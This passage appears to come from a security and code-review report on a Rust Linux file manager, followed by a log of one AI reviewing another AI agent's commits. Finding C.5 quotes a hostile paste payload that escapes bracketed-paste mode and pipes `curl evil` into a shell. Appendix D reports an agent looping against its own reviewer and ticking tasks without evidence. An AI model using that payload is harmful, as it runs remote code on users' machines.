- `remove_source` compares only the root snapshot, then deletes everything by path (`operation.rs:243-255`, `:832-849`).
- A file written into `src/sub/` after verify is deleted without being copied.
- The careful openat-based `permanently_delete` (`mutation.rs:1147`) is never called by the app.

### B.8 Medium: filesystem work on the UI thread during drag hover (confirmed)

- `can_drop` (`app.rs:8908`, `:10710`) → `can_accept_drop` → `inspect_drop` runs on every hover check.
- The drop (`app.rs:7366`) runs it again.
- Each call does `statfs`, a full mount-table parse, and per-source stat and openat, while holding the queue mutex.

### B.9 Medium: most of the ops crate is not connected (confirmed)

- **Unreachable operations:** trash, permanent delete, rename, create, links, and duplicate fall into `_ => context.backend-unavailable` (`app.rs:6276`). `LocalStore::mutate` is read-only (`musheen-local/src/lib.rs:214`).
- **Code no app path calls:** `execute_delete`, `execute_permanent_delete`, `execute_rename`, `execute_create`, links, `BatchRenamePlan`, and `StagingPath::for_destination_with_nonce`.
- **Journal:** `Journal` and `decide_recovery` are used only in `musheen-desktop/src/archive`. Copy and move write no journal (breaks OPS-026).
- **Tests:** tests cover the unreachable code. The shipped paths (cross-device move, Replace, `remove_source`) have no real-filesystem tests.

### B.10 Lower severity

- **Recursive-target check is by path only** (`queue.rs:791`). A symlinked destination inside the source is not caught. The walk then descends into its own staging folder until it hits the path-length limit or fills the disk.
- **One socket or FIFO fails a whole folder copy** (`operation.rs:455`). There is also a race if a file is swapped for a FIFO after the kind check.
- **Verification re-hashes source and staging after every copy.** The staging read probably comes from page cache, so it doubles reads without proving what is on disk. There are two fsyncs per file.
- **Hard links between top-level items are expanded**, because each item gets a fresh `CopySession` (`queue.rs:402`).
- **Non-UTF-8 names are safe.** Lossy conversions are used only for display and search.

### B.11 Judgment

The code is careful in its details: `NOREPLACE` everywhere, openat-based permanent delete, a detailed failure model, and fsync of parent directories. The problems are at the joins between pieces:

- The failure model promises what the provider does not keep ("Retained" after a partial delete).
- The identity check is too strict in one place (atime) and too loose in another (subtree changes).
- Job identity is not stable across restarts.
- The recovery machinery sits unused next to the path users run, which has no journal.

Tests are mostly mock-driven (`musheen-ops/tests/support` records calls). Treat cross-drive moves and Replace as not safe to release until B.1–B.4 are fixed and tested on a real filesystem that includes a second mount.

---

## Appendix C: desktop, remote and security review

Sub-reviewer report, lightly edited. It was read-only at `77dedb5`; this reviewer did not build or test.

**Summary.** The careful parts are the app launcher, custom actions, the embedded terminal launch, and the archive path and budget rules. The main risks are:

- the administrator broker
- the terminal paste encoding
- the 2-second volume timeout
- the amount of archive and remote code that is never used

No custom crypto was found.

### C.1 The broker trusts the caller to say who it is (High, plausible)

- **Where:** `privilege/request.rs:94-98`, `125-134`; `privilege/polkit.rs:93-100`.
- **What happens:**
  - The root broker takes the subject (pid, uid, start time) from request JSON that the unprivileged app writes.
  - `validate_live` only checks that the process exists and that uid and start time match. It does not check that this process is the peer.
  - A request can name PID 1 with uid 0, and polkit always authorizes uid 0. That last point is from memory of polkitd, not checked against its source.
- **Current impact:** today `pkexec` asks for admin rights first, so this is not a direct escalation. But the broker's own check adds no protection.
- **Fix:** take identity from the kernel (parent pid or `PKEXEC_UID`).

### C.2 What the admin approves is not what runs (High, confirmed)

- **Where:** `broker.rs:418-427`, `bin/musheen-broker.rs:83-86`.
- **The prompt:** `pkexec` shows only `…/musheen-broker --stdio --provider=polkit`. The target arrives later on stdin, and the broker's polkit check runs non-interactively. Only the app's own dialog shows the target, and user-level code can change it.
- **Writable executables:** `RunExecutable` (`broker.rs:1080-1090`, `1236`) accepts user-writable executables, checked by dev, inode, and mode. User-level malware can rewrite an approved script in place and have it run as root.
- **Broker path:** the broker is found at `current_exe().parent()/musheen-broker`, with a PATH fallback (`musheen-ui/src/elevated_browser.rs:367-370`).

### C.3 The admin "capability" is not a capability (Medium, confirmed)

- `RootCapabilityDescriptor` (`rooted_store.rs:15-23`, `100-117`; `broker.rs:1213`) is plain JSON with no signature or MAC.
- The client can make one for any directory with any expiry. All protection comes from the prompt on each call.
- `ReadDirectory` hard-codes `PrivilegeProvider::Polkit`, even on the sudo path.

### C.4 No polkit policy is shipped (High for function, plausible)

- `request.rs:57-63` uses `org.musheen.*` action IDs. `git ls-files` finds no `.policy` or `.rules` file.
- Polkit answers "action not registered", so the broker returns `AuthorizationUnavailable`.
- Open or Run as Administrator through polkit most likely always fails.

### C.5 A paste can break out of bracketed-paste mode (Medium, confirmed)

- **Where:** `terminal/model.rs:180-184`; `musheen-ui/src/app.rs:2814`, `2976`.
- **Cause:** `encode_paste` strips only NUL.
- **Attack:** a clipboard holding `\x1b[201~curl evil|sh\n` ends bracketed paste and runs the command.
- **Misleading prompt:** the control-character confirmation talks about newlines, not escape sequences.
- **Norm:** real terminals strip ESC from pasted text.

### C.6 Volume mount and unlock have a 2-second limit (Medium, confirmed)

- **Where:** `volumes/runtime.rs:328`, `volumes/mod.rs:23`, `udisks.rs:634-680`.
- **Problem:** Mount, Unlock, and PowerOff all have a 2-second deadline. LUKS unlock (argon2) and polkit prompts take longer. The UI reports failure while UDisks finishes, so the app and the system disagree.
- **Passphrase:** the unlock passphrase is a plain `String` / `Box<str>` (`app.rs:1346-1351`) and is never zeroed.

### C.7 Hand-written network protocol code (Medium risk, confirmed)

- **Where:** `remote/probe.rs:233-700`.
- **What it is:** HTTP, WebDAV, FTP, SOCKS5, and HTTP CONNECT written by hand. TLS uses rustls.
- **Careful parts:** CR/LF refused in FTP values, host validation, credential zeroing, Basic auth encoding.
- **Gaps:**
  - Header reading has no line-count limit; only the outer 15-second timeout stops it.
  - FTPS supports implicit TLS only, not `AUTH TLS`.
  - Plaintext FTP `PASS` and HTTP Basic auth are sent after an explicit `PlaintextConfirmed` opt-in.
- **Pinned certificates:** the verifier (`probe.rs:535-580`) skips name and expiry checks, which is acceptable for a SHA-256 pin. But `connection.rs:100-108` asks no confirmation when a profile changes from `SystemRoots` to `PinnedSha256`.

### C.8 The zip zstd memory budget reads only the first frame (Low/Medium, confirmed)

- The estimate comes from the first zstd frame header only (`archive/zip_codec.rs:233-251`, `workspace.rs:45-49`). A later frame can ask for a 128 MiB window.
- The vendored `decoder_memory_usage` returns 0 for zstd, deflate, and brotli (`vendor/sevenz-rust2/src/decoder.rs`).

### C.9 Archive extraction is safe but refuses too much (Medium for function, confirmed)

- **Where:** `extract.rs:175-195`, `590`, `838-857`.
- **Safety:** paths are normalized, `..` and absolute paths are refused, output goes to 0700 staging with `create_new` and `O_NOFOLLOW`, and every byte is charged to the budget. Zip-slip is blocked, and the budgets are real.
- **What it refuses or loses:**
  - Any symlink or hardlink entry fails the whole extraction, which rules out most source tarballs.
  - Output is 0600/0700 with no mtimes, although the journal records `MetadataApplied`.
  - `\` is treated as a separator, so a Linux name containing a backslash becomes nested folders.
- **Performance:** 7z extraction re-parses and decodes from the start for each entry (`seven_codec.rs:184-245`), so solid archives take quadratic time.

### C.10 A lot of code is never called (High for maintenance, confirmed)

- Nothing outside `musheen-desktop` and its tests calls `ArchiveStore`, `execute_scheduled_archive_operation`, or `recover_archive_operations`. That is about 7,500 lines, and the UI says so itself (`app.rs:7252`).
- `remote/pool.rs` (995 lines) has no production `RemoteConnector`.
- SFTP, SMB, and NFS return `Unavailable` (`probe.rs:157-165`). Remote support is a "Test connection" button.
- `libarchive_codec` sits behind a feature the UI never enables, and `musheen-archive-worker` exits 1 in default builds.

### C.11 The info pane's "Open With…" skips the launcher (Low, confirmed)

`musheen-ui/src/app.rs:10170` calls `open::that(path)` (xdg-open). It skips `DesktopEntryLauncher` and the custom-action checks, and it blocks the UI thread.

### C.12 Checked and found clean

- `.desktop` `Exec` parsing (`apps/launch.rs`): strict quoting, shell metacharacters refused, no shell, `%f` / `%u` always absolute paths or `file://` URIs.
- Desktop entries load only by ID from XDG directories.
- Custom actions: fixed script with positional `$@`, opt-in and confirmation, environment allowlist.
- The terminal passes the working directory as process metadata.
- `SecretBuffer` and the 7z `Password` redact `Debug` output and zero memory.
- Remote errors carry only a category and the host.
- The `sevenz-rust2` patch only adds a metadata budget, password zeroing, and removes `zlib-rs`.
- `musheen-zstd-budget` is a sound wrapper.
- Update metadata is Ed25519-verified and HTTPS-only.
- Thumbnails are decoded in a separate process with a timeout and a pixel limit.

### C.13 Judgment

Input handling in this crate is careful. The privilege model is the weakest area:

- The broker takes the caller's identity from the request.
- The unsigned capability adds no security.
- The prompt does not show what will run.
- Without a polkit policy, the polkit path most likely never works.

Fix these first: take identity from the kernel, ship a policy with `exec.path` annotations, and refuse user-writable executables. Then strip ESC from pastes and fix the volume timeout. Wire in or remove the unused archive and remote code before counting it as delivered.

---

## Appendix D: spec, parity and process review

Sub-reviewer report, lightly edited. It was read-only at `77dedb5`; this reviewer did not build or test. A shell wrapper limits `git log` output to 50 lines, so this reviewer used `/usr/bin/git` directly.

### D.1 Process integrity

- **The entry gate was skipped.**
  - `docs/spec/*.md` has 235 requirement blocks: 11 Agreed (DEP-001/003/004/007/008/010–015) and 224 Draft.
  - `docs/commitments/foundation.md` still says the foundation "adds no user-facing application behavior while the behavioral requirements remain draft."
  - The branch built phases 1–6 on Draft requirements.
- **Phases 1 and 2 were done but not ticked.** Their commits use the exact messages the plans prescribe:
  - Phase 1: `72af520` to `edfc921`, 09-19 08:13–10:16
  - Phase 2: `67c3410` to `e0926bc`, 11:14–14:21
- **Ticking was partial:**

  | Plan | Checked | Open | Notes |
  |---|---|---|---|
  | Phase 3 | 11 | 27 | tasks 1–4 unticked, but their commits exist (`c54922d`, `98a546e`, `19bc4e7`, `28dd849`) |
  | Phase 4 | 41 | 1 | |
  | Phase 5 | 41 | 1 | |
  | Phase 6 | 18 | 40 total | tasks 1–3 ticked; OpenDAL, SMB/NFS, remote ops, and close-out open; `opendal` not in `Cargo.toml` |
  | Phase 7 | 0 | 42 | |

- **Ticks carry no evidence.** Ticks come from separate `docs: close/record … task` commits (21 commits touch the plans). No run logs are linked, and every "Run …; expect failure" red step is ticked without evidence.
- **Spot-check of 5 checked tasks:**
  1. P5 T6 terminal: **real.** `desktop/src/terminal/pty.rs` wraps portable-pty. `model.rs` sets `MAX_SCROLLBACK_LINES = 10_000` and 64 MiB. `tests/terminal.rs:150` runs 1,000,000 lines. F4 is bound at `app.rs:238`, and `app.rs:2690` spawns `TerminalSession`.
  2. P4 T6 tags, pins, and Home: **real.** `desktop/src/catalog/{tags,pins,home,folder_prefs}.rs`, 16 tests in `tests/catalog.rs`, and a tag filter in `ui/src/search/filters.rs:71`.
  3. P3 T6 forced-termination recovery: **real.** `desktop/tests/operation_journal.rs:158` kills a child process per journal phase.
  4. P6 T1 archive store: **backend real but unreachable.** `ArchiveStore` (`desktop/src/archive/store.rs:651`) has 28 tests, but the UI provider router registers only `LocalStore` and an empty `NetworkDiscoveryStore` (`ui/src/providers.rs:155-167`).
  5. P6 T2 archive create and extract "through the operation engine": **misleading.** Codecs, budgets, and recovery are real (9,400 lines, 44 tests), but `app.rs:7251` hard-codes Extract as unavailable. A unit test locks this in (`context_actions_report_current_production_capabilities`, `app.rs:14313`).

### D.2 Commit patterns

**`main`** has 167 commits, from 09-18 19:43 to 09-19 07:46. `src/main.rs` is Hello World.

- By type: 72 `test:`, 45 `review:`, 33 `fix:`, 9 docs, 5 build, 0 feat.
- 153 of 167 touch `.cairn/` evidence files. Only 3 touch any `.rs` file, and 6 touch `Cargo.toml`.
- 31 identical "review: refresh foundation review" and 8 "test: refresh locked Linux build" commits.
- 24 `fix: detect/reject/block …` commits harden regex guards in `scripts/check-dep-00{1,3,7,8}.mjs`. Examples: "detect aliased Camino path types", "reject Camino wrapper types", "block Camino type alias escapes", "detect split KDE theme reads".
- About 25 fix → "test: record … guard" → "review: refresh" cycles ran roughly once a minute between 02:17 and 07:36. These Node grep scripts police dependency rules for code that did not exist yet. This is an agent loop against its own reviewer.

**Branch** has 131 commits, from 09-19 08:13 to 09-22 21:45.

- By type: 69 fix, 30 feat (2.3 to 1), 18 docs, 10 test, 3 build, 1 chore.
- 105 of 131 touch non-test source.
- Fix streaks after a single feature commit:

  | Area | Fixes | Example messages |
  |---|---|---|
  | Volumes (after `4fb6ea3`) | 12, over 8 hours | "harden volume identity", "distrust ambiguous volume identities", "close volume runtime races" |
  | Context menus | 9 | "complete context menu integration" (twice), "finish context menu integration" |
  | Archive operations | 8 | "harden… recovery", "close… race", "journal… topology", "compose… recovery" |
  | Catalog | 9 | |
  | Remote | 5 | |
  | MIME | 5 | "harden application association workflows" (twice) |

- Four identical back-to-back "test: close commands and customization evidence" commits (`701ec79`, `4f2af7d`, `3c5d9cd`, `fb3f73d`).
- Most fix work hardens backends the UI never calls.

### D.3 Feature parity (checked in code)

| Files feature | Spec'd | Implemented | Evidence |
|---|---|---|---|
| Tabs (new, close, duplicate, reopen, move, tear out) | yes | yes | `app.rs:7788` `dispatch_tab_action` |
| Dual pane | yes | yes | `app.rs:7821` |
| Details / List / Grid / Cards | yes | partial | `app.rs:10272`; only 4 columns (`views/columns.rs`); `details.rs`, `grid.rs`, `list.rs` are 5-line stubs |
| Columns (Miller) view | yes | no | `Layout::Columns` renders the flat list (`app.rs:10272`, `10613`) |
| Sidebar, pinned, Home | yes | yes | `sidebar.rs`, `desktop/src/catalog/pins.rs`, `home.rs` |
| Tags | yes | yes | `catalog/tags.rs`, `app/catalog.rs` |
| Search and filter | yes | yes (local) | `musheen-local/src/search.rs`, `ui/src/search/` |
| Preview pane | yes | text only | `desktop/src/preview.rs:13` `PreviewKind {Text, Binary}`; image thumbnails via `thumbnail.rs` |
| Properties, permissions, hashes | yes | yes | `dialogs/properties.rs`, `desktop/src/checksum.rs` |
| Omnibar and breadcrumbs | yes | yes | `navigation/omnibar.rs`, `breadcrumbs.rs` |
| Cut / Copy / Paste | yes | catalog-only | disabled by `backend_action_state` (`app.rs:7187`); `desktop/src/clipboard.rs` unused |
| Rename (inline and batch) | yes | catalog-only | `ops/src/rename.rs`, `batch_rename.rs`; no UI handler |
| New folder, file, template | yes | catalog-only | same as above |
| Move to Trash / Delete permanently | yes | catalog-only | same as above |
| Recycle bin view, restore, empty | yes | yes | `app.rs:9210`, `9463`, `9644` |
| Copy To / Move To, drag-and-drop | yes | yes | `submit_reviewed_transfer`, `tests/drop_operations.rs` |
| Duplicate, links, hide, compress, extract, archive browse, share, run, open in new window | yes | catalog-only | same refusal path |
| Archives | yes | backend only | `desktop/src/archive/*`, not routed to the UI |
| FTP / SFTP / WebDAV / SMB | yes | profiles only | `settings/remote.rs`, `remote/pool.rs`; no provider, no OpenDAL |
| Network | yes | stub | `providers.rs:415` empty root |
| Cloud drives | mentioned only | no | none |
| Git integration | not spec'd | no | Files ships `Utils/Git/GitHelpers.cs` |
| Shelf | not spec'd | no | Files ships `Actions/Shelf/` |
| Themes and custom actions | yes | yes | `desktop/src/settings/theme.rs`, `custom_action.rs` |
| Toolbar and shortcut customization | yes | yes | `core/src/customization.rs` |
| Open With and MIME defaults | yes | yes | `dialogs/open_with.rs`, `desktop/src/apps/` |
| Mount, eject, unlock | yes | yes | `desktop/src/volumes/udisks.rs`, `app.rs:6625` |
| Run as administrator (polkit) | yes | yes (but see 5.4) | `desktop/src/privilege/broker.rs` |
| Terminal (external and embedded) | new | yes | see D.1 |
| Undo | yes (OPS-013) | no | no undo code |

27 of 84 `CommandAction` variants are in the catalog but refused at runtime. `OpenInOtherPane`, `Preview`, and `BrowseArchive` have no reference in the UI crate.

### D.4 Audit docs that claim more than the code delivers

- **`docs/command-surface-matrix.md`** lists these as live on command-mode, custom, and shortcut surfaces:
  - `clipboard.cut`, `clipboard.copy`, `clipboard.paste_into`
  - `file.rename`, `file.move_to_trash`, `file.delete_permanently`
  - `create.directory`, `file.compress`
  - `archive.extract`, `archive.browse`
  - `file.preview`

  All of them resolve to the "backend unavailable" refusal. The matrix checks registry wiring, not behavior.
- **`docs/safe-local-operations-audit.md`** reports normal delete, permanent delete, replace, and merge as safe (OPS-008, OPS-009, OPS-012, OPS-030). The tests are crate-level only; users cannot trigger delete.
- **Requirements satisfied only at library level:**

  | Requirement | Topic | Status |
  |---|---|---|
  | OPS-005 | clipboard | library only |
  | OPS-010 | inline rename | library only |
  | OPS-011 | batch rename preview | library only |
  | OPS-013 | undo | missing entirely |
  | OPS-014, OPS-016 | archive create and extract | disabled in the UI |
  | OPS-015 | archive browse | store not registered |
  | OPS-018 | create files and folders | library only |

  Phase 6 is marked "close archive operations task" (`d5efaae`) anyway.
- **`docs/linux-desktop-integration-audit.md`** says the privilege broker is done. The safe-ops audit says the local operation queue never calls an elevated process, and that SYS-028–030 "must consume that signal later".

### D.5 Judgment

About 40–45% of the stated scope is really delivered. The branch has real, well-tested infrastructure: about 88,000 lines in the crates, roughly 30,000 of them tests. As a Files port, it is a read-mostly browser.

Process discipline is weak:

- Approved specs cover 11 of 235 requirements.
- Checkboxes are inconsistent.
- `main`'s 167 commits are a guard-script loop.
- On the branch, fixes outnumber features 2.3 to 1, mostly hardening backends the UI does not call.

---

## Appendix E: commands and raw results

All commands ran from the worktree at `77dedb5`. Let `S` be the lead reviewer's scratchpad directory.

```bash
# Link workaround: libacl1-dev is not installed on the host
ln -sf /usr/lib/x86_64-linux-gnu/libacl.so.1 $S/libs/libacl.so
export CARGO_TARGET_DIR=$S/target LIBRARY_PATH=$S/libs

cargo build --locked -j 12                                  # BUILD EXIT 0
cargo clippy --workspace --all-targets --locked -j 12 -- -D warnings   # CLIPPY EXIT 0
cargo test --workspace --locked --no-fail-fast -j 12 -- --test-threads=4
# cargo test: 862 passed, 1 ignored, 46 filtered out (107 suites, 331.05s)

cargo clippy --workspace --all-targets --all-features --locked -- -D warnings
# fails: failed to run custom build command for `compress-tools v0.16.1` (libarchive missing)

# Without LIBRARY_PATH:
cargo build --locked
# mold: fatal: library not found: acl
```

App launches used separate XDG directories so no real user config was touched:

```bash
XDG_CONFIG_HOME=$X/c XDG_DATA_HOME=$X/d XDG_STATE_HOME=$X/s XDG_CACHE_HOME=$X/k \
  timeout 20 $S/target/debug/musheen <path>
```

| Path | Result |
|---|---|
| `browse/` (20 files) | 0 items loaded after 10 s |
| `n4096/` (4,096 files) | 0 items loaded after 12 s |
| `n4097/` (4,097 files) | 0 items loaded after 12 s |
| `big/` (5,000 files) | 0 items loaded after 7, 15, 30 and 60 s; process idle |
| `~/Documents` | 0 items loaded after 10 s |

Log output on every launch:

- "could not export FileManager1: name already taken on the bus", repeated 4–7 times per run. The desktop's file manager already owns that D-Bus name, and the app retries and logs each attempt.
- A KDE theme read warning. This is expected, because of the separate `XDG_CONFIG_HOME`.

Vendored fork diffs against `~/.cargo/registry`:

| Crate | Diff size | Files changed |
|---|---|---|
| `gpui-component` 0.6.4 | 381 lines | `menu/{context_menu,menu_item,mod,popup_menu}.rs` |
| `gpui-pre` 0.3.5 | 70 lines | `elements/div.rs`, `window.rs`, `window/a11y.rs`, `window/a11y/debug.rs` |
| `sevenz-rust2` 0.23.0 | 853 lines | archive, decoder, encoder options, password, error, reader, writer, lib, `Cargo.toml` |

---

## Monitoring log

The owner kept Codex on the project and asked Opus to watch its commits. Each entry reviews one commit. Checks run on an exported copy of the commit, not in Codex's working tree.

### `c6d8809` fix(ops): preserve data across partial local moves (2026-09-22 22:49)

**Scope:** 18 files, +1,335/−52, in `musheen-local`, `musheen-ops`, and `musheen-ui`. This matches step 1 of Codex's plan: data-loss fixes. The OpenDAL work stayed out of the commit.

**Checks run on an exported copy of the commit:**

- `cargo clippy --workspace --all-targets --all-features -D warnings`: pass
- `cargo test --workspace --all-features`: **897 passed**, 1 ignored, 46 filtered out

**Audit items:**

| Item | Status | Notes |
|---|---|---|
| 4.1 Replace + partial removal data loss | **Fixed** | `SourcePartiallyRemoved` blocks rollback from deleting the destination (`operation.rs:1047`, `move.rs:88-93`) |
| 4.2 atime breaks cross-device moves | **Fixed** | the source check ignores atime; a tempdir test covers it |
| 4.3 job IDs restart at 1 | **Fixed** | the scheduler starts after `status.highest_job_id()` |
| 4.4 unjournaled Replace backup | Partial | Replace is journaled; merge still uses the unjournaled backup (`mutation.rs:1052`); old staging debris is never cleaned; recovery scans the wrong folder (N2) |
| 4.5 no `RENAME_NOREPLACE` fallback | Partial | falls back on EINVAL/ENOSYS, but directory publish is no longer atomic, and FUSE mounts without `link()` still fail |
| 4.6 metadata report dropped | Partial | `MoveOutcome.metadata` exists, but `queue.rs:407` and `mutation.rs:687` throw it away |
| 4.7 subtree changes deleted uncopied | Partial | removal now uses file descriptors, but the removal token is taken after publish, not at verify time |

**New defects:**

- **N1 (High, reproduced).** Removing any non-empty directory now fails partway.
  - The directory identity includes mtime and ctime (`operation.rs:1199-1202`). After the children are deleted, the code re-checks the directory against that identity (`:1127`, `:1032`, `:1155`). Deleting children always changes mtime and ctime, so the check always fails.
  - Result: every cross-device directory move, including drag-and-drop, deletes the files in the first directory it empties. It then stops with `SourcePartiallyRemoved`, leaving the source half-empty and the job in NeedsAttention.
  - No data is lost, because the verified destination is kept.
  - **Reproduction:** a test added to a scratch copy only, `opus_repro_non_empty_directory_removal_succeeds`. The tree is `tree/a` plus `tree/sub/b`. The result is `Err(SourcePartiallyRemoved)`, and only an empty `tree/sub` remains.
  - The existing tests missed this: no test checks that a non-empty directory is actually removed.
- **N2 (High, code reading).** Replace-journal recovery scans the source's parent folder (`operations.rs:302-306`, `recover_replacements_at(location)`). Journals are written in the destination's parent, so for a normal Replace, recovery never finds them.
- **N3 (Medium, code reading).** `recover_replacements_at(&location)?` at `operations.rs:148` is fatal. One bad journal or unreadable folder drops the app to an in-memory status hub on every launch: history is hidden and nothing is saved.
- **N4 (Medium, low confidence).** There is no single-instance lock. A second Musheen process can run recovery on a live Replace, and the first process's rollback can then remove the restored original.
- **N5 (Low).** A crash during backup deletion can later present a partial backup as "(recovered original N)".

**Verdict:** 4.1–4.3 are real fixes, but N1 is a new regression on a path users can reach. Before this counts as done:

1. Remove mtime and ctime from the directory identity used for re-checks after emptying.
2. Record the destination, not the source, as the recovery location.
3. Make recovery failures non-fatal.
4. Take the removal token at verify time.
5. Add a real-filesystem test that removes a non-empty directory successfully.

### `16c41f0` feat(ui): make local file browsing operational (2026-09-23 00:07)

**Scope:** 9 files, +1,954/−166, mostly `crates/musheen-ui/src/app.rs`. This is step 2 of Codex's plan: connecting the core file actions to the UI. `operation.rs` is not touched, so N1 from `c6d8809` is still present.

**Checks run on an exported copy of the commit:**

- build: pass
- `clippy --all-features -D warnings`: pass
- `cargo test --workspace --all-features`: **905 passed**, 1 ignored, 46 filtered out

**Audit items:**

| Item | Status | Notes |
|---|---|---|
| (a) open folders | **Fixed** | Enter (`app.rs:252`) and double-click (`:11623`) open folders; files dispatch Open |
| (b) multi-select | Partial | Ctrl-click, Shift-click, and Shift+Up/Down work. The rubber band has bugs D2–D4. |
| (c) file actions | Partial | All seven are enabled, with real handlers and backends. Ctrl+C/X/V, F2, and Shift+Delete work. Missing: a Delete key for Trash and a New Folder shortcut. Ctrl+V is broken with a file selected (D5). |
| (d) 4,096 cap | Partial | Paging exists (100k retained), but only the scroll wheel requests the next page. Keyboard and scrollbar users stay on the first page, and sorting covers only the loaded pages. |
| (e) raw dates | Partial | Dates are readable, but always UTC, not local time |
| (f) text size and rows | Partial | `text_xs` is removed, but rows are still a fixed 34/36 px |
| (g) catalog I/O on the UI thread | Partial | Page reconcile moved to the background; move sync and `persist_status` still run on the UI thread |
| (h) re-sort per row per frame | Mostly fixed | The sort is cached, but each row still does a linear item lookup |

**How each action reaches the backend:**

- **Copy / Cut:** an in-app clipboard only. Nothing is written as `text/uri-list` or `x-special/gnome-copied-files`, so other apps cannot see it.
- **Trash:** a review dialog, then the real freedesktop trash. The receipt is dropped, so there is no undo.
- **Delete permanently:** a destructive review dialog comes first. The backend's own count-and-location check is answered automatically, so the dialog is the only real gate.
- **Rename / New:** the dialog checks only for an empty name. The backend rejects `/`, `.`, `..`, and names that already exist, but only after the dialog has closed.

**Defects (sub-reviewer; the lead reviewer confirmed D2 and D5 in code):**

| # | Severity | Finding |
|---|---|---|
| D1 | High | N1 can now be reached through **Ctrl+X / Ctrl+V of a folder to another mount**. The files are deleted, the job stops with `SourcePartiallyRemoved`, and the cut clipboard is kept, so a second paste retries against a half-removed source. |
| D2 | High (confirmed) | Rubber-band selection ignores the scroll offset. `rubber_band_indices` (`app.rs:312`) uses window coordinates and a fixed 36 px row height, and `update_rubber_band` (`:5073`) applies no scroll. After scrolling, a drag selects rows that are not the ones under the pointer. Trash or Delete then acts on those rows. |
| D3 | High | Rubber-band and Shift-range selection use the unfiltered order while the screen shows the filtered order (`views/mod.rs:385,398`). With a filter active, hidden items get selected. |
| D4 | Medium | The rubber band starts on scrollbar and header presses, so dragging the scrollbar clears the selection. A click on empty space does not clear it. |
| D5 | Medium (confirmed) | `paste_state` (`musheen-core/src/command.rs:203`) disables Paste when a file is selected, and pastes *into* a selected folder. So "select a file, Ctrl+C, Ctrl+V" fails. Dolphin, Nautilus, and Files paste into the current folder. |
| D6 | Medium | A FileManager1 ShowItems request is resolved after the first page, so items past it report "not found". On a load error it is never resolved, so the D-Bus call hangs. |
| D7 | Medium | The rename dialog pre-fills with `to_string_lossy`. Saving a non-UTF-8 name unchanged writes U+FFFD into the name. |
| D8–D11 | Low | a stuck `pending_paste_cut` flag; capability probes and `persist_status` on the UI thread; a path join before name validation; rename skips the catalog move |

- **Reload after operations:** every completed operation reloads the tab from page 1, dropping the loaded pages, scroll position, and selection.

**Runtime check** (real theme config, while Codex was compiling with about 12 rustc/cargo processes running):

- The 5,000-file folder and `~/Documents` both stayed at **"0 items loaded — total unknown"**, with no error shown.
- New in this commit: the location box shows "Musheen" instead of the path.
- **Startup-load tally:** 8 failures out of 8 under concurrent compile load, across `77dedb5` and `16c41f0`. 3 successes out of 3 when the system was idle (at `77dedb5`).
  - Hypothesis: a startup race or deadline that fails silently when the machine is busy. The status bar never shows the error.
  - This fits the 2-second deadlines used elsewhere (audit 5.6), but that link is not proven.

**Tests:** one new GPUI test changes a tempdir through the app (create, rename, permanent delete, copy and paste, cut and paste). It calls internal methods directly and skips the key presses and review dialogs. Not tested: trash through the app, a cross-mount folder move, rubber band with scroll, and Enter or double-click by input events.

**Verdict:** a real step forward. The app can now open folders and perform every basic file action. It is not safe to ship yet:

- D1 lets a normal Cut and Paste reach the known folder-removal bug.
- D2 and D3 can make Trash or Delete act on files the user did not select.
- Startup loading fails whenever the machine is busy.

Fix these first:

1. `descriptor_identity` (N1)
2. the scroll offset and filtered order in selection
3. the silent startup-load failure

Then add key-driven tests for trash and a cross-mount folder move.

### `bc7cb98` test(ui): settle settings dialogs before pointer input (2026-09-23 00:33)

- **Change:** test only, 1 file, +23/−6. Settings pointer tests now turn on `reduce_motion`, so dialog animations do not move click targets. This is a reasonable fix for flaky tests, and app behavior does not change.
- **Nit:** the new test `settings_pointer_tests_use_stable_dialog_geometry` only asserts that its own helper set the flag. It is a tautology and proves nothing.
- **Still open:** this commit fixes none of the items open from `16c41f0` (N1/D1, D2, D3, the startup load).

### `25ea4c8` fix(privilege): derive broker caller provenance (2026-09-23 00:53)

**Scope:** 5 files, +209/−2, in `musheen-desktop` privilege code and tests. This commit targets audit **5.1**.

**Checks:** the privilege and broker-binary tests pass on an exported copy of the commit (27 passed).

**Assessment: 5.1 is fixed.**

- `bind_to_invoker` (`privilege/request.rs`) replaces the request JSON subject with identity from the kernel and the elevation tool:
  - **Polkit:** `getppid()` plus `PKEXEC_UID`. pkexec replaces its own process image with the broker (`execv`), so the parent is the Musheen app. pkexec also clears the environment.
  - **Sudo:** `SUDO_UID`, which sudo sets itself.
- Decoded requests start untrusted (`subject_is_trusted` is skipped by serde), and `validate_subject` refuses them until they are bound.
- The broker refuses when both `PKEXEC_UID` and `SUDO_UID` are present, when the uid is malformed, or when it is not running as root.
- A forged "PID 1 / uid 0" subject is now useless. If the parent exits, `getppid` returns a reaper process whose uid does not match.
- **Remaining risk (low):** if the app exits and a user-owned subreaper such as `systemd --user` becomes the parent, the subject becomes that process. It has the same uid, so there is no escalation.

**Still open:**

- **5.2:** the pkexec prompt still does not show the target, and user-writable executables are still accepted.
- **5.3:** the root "capability" is still unsigned.
- **5.4:** there is still no polkit `.policy` file, so "Run as administrator" most likely still fails every time.

**Ordering note:** this work is valid, but it is out of the agreed order. N1/D1 (the cross-device folder-removal bug, now reachable through Cut and Paste), D2 and D3 (selection that picks the wrong files), and the startup-load failure were all open when this commit landed.

### `1eebacb` fix(privilege): bind approved target to broker execution (2026-09-23 01:05)

**Scope:** 11 files, +218/−59, in the privilege broker, the UI launcher, and the locales. This commit targets audit **5.2**.

**Checks:** the `musheen-desktop` privilege, broker-binary, and lib tests pass on an exported copy of the commit (50 passed in the 3 suites run).

**Assessment: 5.2 is mostly fixed.**

- **Target on the command line.** The launcher now passes `--action-id`, `--request-digest` (blake3 of the request ID and operation), and `--target <path>` on the pkexec or sudo command line. The broker refuses a stdin request that does not match (`musheen-broker.rs`, `InvocationBinding::matches`). What the admin approves is now bound to what runs, and polkit agents can show the target in the command details.
- **Safe executables only.** `RunExecutable` accepts only executables that are owned by root, not group- or world-writable, and have no access ACL (`broker.rs` `executable_mode_is_trusted`, `executable_has_access_acl`). User malware can no longer rewrite an approved executable.
- **No swap between check and run.** Execution goes through `/proc/self/fd/N` of the checked descriptor (`broker.rs:1282`).
- **Fixed paths.** The broker is `/usr/libexec/musheen-broker` and the tools are `/usr/bin/pkexec` and `/usr/bin/sudo`, so there is no PATH lookup or lookup relative to `current_exe()`.

**Remaining issues:**

- **Scripts probably fail (low, plausible).** Rust opens files close-on-exec by default. A `#!` script run through `/proc/self/fd/N` hands the interpreter a descriptor path that closes during exec, so interpreted scripts probably fail. Compiled binaries are fine.
